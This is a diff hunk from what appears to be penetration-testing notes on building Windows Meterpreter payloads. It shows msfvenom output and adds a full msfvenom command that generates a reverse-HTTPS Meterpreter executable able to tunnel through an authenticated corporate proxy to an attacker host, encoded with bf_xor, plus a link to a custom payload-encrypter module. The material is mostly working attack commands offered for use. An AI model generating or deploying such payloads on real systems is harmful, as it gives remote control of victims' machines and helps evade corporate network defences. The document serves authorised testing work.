@@ -61,8 +61,10 @@ Payload size: 877 bytes
 Final size of exe-only file: 73802 bytes
 Saved as: reversehttps.exe
 
-NOTE: msfvenom command to generate a meterpreter that is able to go trhough a corporate proxy
-➤ msfvenom -p windows/meterpreter/reverse_https_proxy EXITFUNC=thread HttpProxyHost=X.X.X.X HttpProxyPort=8080 HttpProxyUser="Domain\account" HttpProxyPass=AccountPassword LHOST=Y.Y.Y.Y LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
+NOTES: 
+➤ Custom msfvenom encrypter module => https://github.com/Sogeti-Pentest/Encrypter-Metasploit
+➤ msfvenom command to generate a meterpreter that is able to go trhough an authenticated proxy
+   msfvenom -p windows/meterpreter/reverse_https_proxy EXITFUNC=thread HttpProxyHost=X.X.X.X HttpProxyPort=8080 HttpProxyUser="Domain\account" HttpProxyPass=AccountPassword LHOST=Y.Y.Y.Y LPORT=443 -a x86 -e x86/bf_xor -f raw -f exe-only -o reversehttps.exe
 
 
 3 - Set up and launch a Meterpreter handler (windows/meterpreter/reverse_https)
